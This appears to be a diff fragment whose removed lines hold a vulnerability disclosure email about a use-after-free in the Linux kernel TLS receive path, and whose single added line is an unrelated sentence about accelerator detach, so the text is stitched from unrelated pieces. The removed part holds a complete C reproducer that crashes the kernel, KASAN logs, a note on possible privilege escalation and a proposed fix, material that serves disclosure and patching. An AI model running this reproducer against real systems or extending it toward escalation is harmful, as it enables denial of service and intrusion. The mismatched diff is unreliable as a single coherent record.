-        skb_attempt_defer_free()
-          __kfree_skb()
-
-4. Now if recvfrom() (tls_sw_recvmsg()) is called on the TLS socket, we fir=
-st hit a WARNING in tls_strp_msg_load() due
-to a state mismatch (tcp_inq(strp->sk) is now 0). Then we hit UAFs on the a=
-nchor fraglist.
-In our repro, this also triggers a BUG_ON in skb_to_sgvec().
-
-...
-  tls_sw_recvmsg()
-    tls_rx_rec_wait()
-      tls_strp_msg_load()
-        ...
-        WARN_ON(tcp_inq(strp->sk) < strp->stm.full_len)
-    ...
-    tls_rx_one_record()
-      tls_decrypt_sw()
-        tls_decrypt_sg()
-          skb_nsg()
-            __skb_nsg()
-              # Use-After-Free
-          ...
-          skb_to_sgvec()
-            __skb_to_sgvec()
-              BUG()
-
-
-Similar to the scenario described above, the same bug can also be triggered
-by using getsockopt(TCP_ZEROCOPY_RECEIVE).
-
-In this case the issue is that TCP_ZEROCOPY_RECEIVE can be used to drain th=
-e sk_receive_queue
-while a skb is still referenced in the anchor's fraglist.
-This version behaves like the one described above, but here the user first =
-sends=20
-data to the ULP, then the socket is drained via getsockopt(TCP_ZEROCOPY_REC=
-EIVE):
-
-...
-  tcp_zerocopy_receive()
-    receive_fallback_to_copy()
-      tcp_recvmsg_locked()
-        tcp_eat_recv_skb()
-          skb_unlink()
-          ...
-          skb_attempt_defer_free()
-            __kfree_skb()
-
-and then recvfrom() is called to trigger the bug.
-
-Using the following repro:
-
-#define _GNU_SOURCE
-
-#include <sched.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <arpa/inet.h>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <linux/tcp.h>
-#include <linux/tls.h>
-
-#define SOL_TCP 6
-//#define USE_TCP_ZEROCOPY_RECEIVE 1
-
-int assign_to_core(int core_id) {
-    cpu_set_t mask;
-    CPU_ZERO(&mask);
-    CPU_SET(core_id, &mask);
-    if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0) {
-        perror("[x] sched_setaffinity()");
-        return -1;
-    }
-    return 0;
-}
-
-int main(void) {
-    char buff[0x1000];
-
-    assign_to_core(0);
-   =20
-    int s0 =3D socket(AF_INET, SOCK_STREAM, 0);
-    int s1 =3D socket(AF_INET, SOCK_STREAM, 0);
-
-    struct sockaddr_in addr =3D {
-        .sin_family =3D AF_INET,
-        .sin_port =3D htons(11337),
-        .sin_addr.s_addr =3D INADDR_ANY,
-    };
-
-    bind(s0, (struct sockaddr *)&addr, sizeof(addr));
-    listen(s0, 1);
-    connect(s1, (struct sockaddr *)&addr, sizeof(addr));
-    int s2 =3D accept(s0, 0, 0);
-
-    struct tls12_crypto_info_aes_gcm_256 tls_ci =3D {
-        .info.version =3D TLS_1_2_VERSION,
-        .info.cipher_type =3D TLS_CIPHER_AES_GCM_256,
-        // ...
-    };
-
-#ifndef USE_TCP_ZEROCOPY_RECEIVE
-    if (!fork()) {
-        recvfrom(s2, buff, 0x1000, 0, NULL, NULL);
-        printf("[T-%d] Packet received!\n", getpid());
-        return 0;
-    }
-
-    usleep(5000);
-#endif
-
-    setsockopt(s1, SOL_TCP, TCP_ULP, "tls", sizeof("tls"));
-    setsockopt(s2, SOL_TCP, TCP_ULP, "tls", sizeof("tls"));
-    setsockopt(s1, SOL_TLS, TLS_TX, &tls_ci, sizeof(tls_ci));
-    setsockopt(s2, SOL_TLS, TLS_RX, &tls_ci, sizeof(tls_ci));
-
-    sendto(s1, "BELLAAAAAA", 10, 0, NULL, 0);
-    usleep(5000);
-
-#ifdef USE_TCP_ZEROCOPY_RECEIVE
-    struct tcp_zerocopy_receive zcr =3D {
-        .copybuf_address =3D (uint64_t)buff,
-        .copybuf_len =3D 0x1000,
-    };
-    socklen_t zcr_len =3D sizeof(zcr);
-    getsockopt(s2, IPPROTO_TCP, TCP_ZEROCOPY_RECEIVE, &zcr, &zcr_len);
-#endif
-
-    printf("[T-%d] Packet sent!\n", getpid());
-    recvfrom(s2, buff, 0x1000, 0, NULL, NULL);
-
-    close(s0);
-    close(s1);
-    close(s2);
-}
-
-We can get the following crash:
-
-[   19.127499] WARNING: CPU: 0 PID: 343 at net/tls/tls_strp.c:487 tls_strp_=
-msg_load+0x52c/0x5c0
-[   19.128912] Modules linked in:
-[   19.129531] CPU: 0 UID: 0 PID: 343 Comm: exp Not tainted 6.16.0 #1 PREEM=
-PT(none)=20
-[   19.130424] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS =
-1.16.2-debian-1.16.2-1 04/01/2014
-[   19.131451] RIP: 0010:tls_strp_msg_load+0x52c/0x5c0
-...
-[   19.140706] Call Trace:
-[   19.140985]  <TASK>
-[   19.141238]  tls_rx_rec_wait+0x90e/0xac0
-[   19.143339]  tls_sw_recvmsg+0x526/0x1c50
-[   19.145218]  inet_recvmsg+0x4cc/0x6f0
-[   19.146184]  sock_recvmsg+0x1d8/0x270
-[   19.146628]  __sys_recvfrom+0x204/0x310
-[   19.148987]  __x64_sys_recvfrom+0xe1/0x1c0
-[   19.150527]  do_syscall_64+0x8f/0x2d0
-[   19.152837]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
-...
-[   19.166493] BUG: KASAN: slab-use-after-free in __skb_nsg+0x470/0x4a0
-[   19.167146] Read of size 4 at addr ffff88810b7421d8 by task exp/343
-[   19.167786]=20
-[   19.167967] CPU: 0 UID: 0 PID: 343 Comm: exp Tainted: G        W        =
-   6.16.0 #1 PREEMPT(none)=20
-[   19.167988] Tainted: [W]=3DWARN
-[   19.167993] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS =
-1.16.2-debian-1.16.2-1 04/01/2014
-[   19.168002] Call Trace:
-[   19.168007]  <TASK>
-[   19.168013]  dump_stack_lvl+0x138/0x1e0
-[   19.168035]  print_report+0xce/0x660
-[   19.168092]  kasan_report+0xdc/0x110
-[   19.168127]  __skb_nsg+0x470/0x4a0
-[   19.168145]  tls_decrypt_sg+0x26e/0x2fc0
-[   19.168363]  tls_rx_one_record+0x131/0x1150
-[   19.168425]  tls_sw_recvmsg+0xa0d/0x1c50
-[   19.168575]  inet_recvmsg+0x4cc/0x6f0
-[   19.168629]  sock_recvmsg+0x1d8/0x270
-[   19.168654]  __sys_recvfrom+0x204/0x310
-[   19.168766]  __x64_sys_recvfrom+0xe1/0x1c0
-[   19.168820]  do_syscall_64+0x8f/0x2d0
-[   19.168921]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
-...
-[   20.953906] kernel BUG at net/core/skbuff.c:5200!
-[   20.954445] Oops: invalid opcode: 0000 [#1] SMP KASAN PTI
-[   20.955024] CPU: 0 UID: 0 PID: 343 Comm: exp Tainted: G    B   W        =
-   6.16.0 #1 PREEMPT(none)=20
-[   20.955963] Tainted: [B]=3DBAD_PAGE, [W]=3DWARN
-[   20.956406] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS =
-1.16.2-debian-1.16.2-1 04/01/2014
-[   20.957388] RIP: 0010:__skb_to_sgvec+0x92d/0xae0
-...
-[   20.966210] Call Trace:
-[   20.966500]  <TASK>
-[   20.966750]  skb_to_sgvec+0x30/0xa0
-[   20.967147]  tls_decrypt_sg+0x129f/0x2fc0
-[   20.970423]  tls_rx_one_record+0x131/0x1150
-[   20.971872]  tls_sw_recvmsg+0xa0d/0x1c50
-[   20.973688]  inet_recvmsg+0x4cc/0x6f0
-[   20.974569]  sock_recvmsg+0x1d8/0x270
-[   20.974982]  __sys_recvfrom+0x204/0x310
-[   20.977212]  __x64_sys_recvfrom+0xe1/0x1c0
-[   20.978559]  do_syscall_64+0x8f/0x2d0
-[   20.980671]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
-...
-
-This UAF read can probably be transformed into a privilege escalation,=20
-as the UAF read can be turned into a UAF write if the anchor undergoes the =
-clone path.
-However, the conditions for that is pretty restrictive,=20
-and may require features such as TLS hardware offload for us to hit such pa=
-ths.
-
-For the getsockopt(TCP_ZEROCOPY_RECEIVE) version of the bug,=20
-we suggest the following check to fix the issue, as the SOCK_SUPPORT_ZC bit=
-=20
-is already cleared in __tcp_set_ulp() [2]:
-
-static int tcp_zerocopy_receive(struct sock *sk,
-                struct tcp_zerocopy_receive *zc,
-                struct scm_timestamping_internal *tss)
-{
-    // [...]
-
-+    /* ZC support has been cleared by ULP */
-+    if (!test_bit(SOCK_SUPPORT_ZC, &sk->sk_socket->flags))
-+        return -EOPNOTSUPP;
-
-    // [...]
-}
-
-For the tcp_recvmsg() version, we could check if there are any processes
-waiting for data on the socket before installing the ULP.
-
-Please let us know if you have any other questions and if there is anything=
- us we can do to help.
-
-Best,
-Savino
-William
-
-[1] https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/comm=
-it/?id=3D5071a1e606b30c0c11278d3c6620cd6a24724cf6
-[2] https://elixir.bootlin.com/linux/v6.16/source/net/ipv4/tcp_ulp.c#L140
+So, in summary, do not allow for custom region callbacks, arrange for
+accelerator detach and just solve the "fail in-flight operations while
+awaiting detach" problem.
 
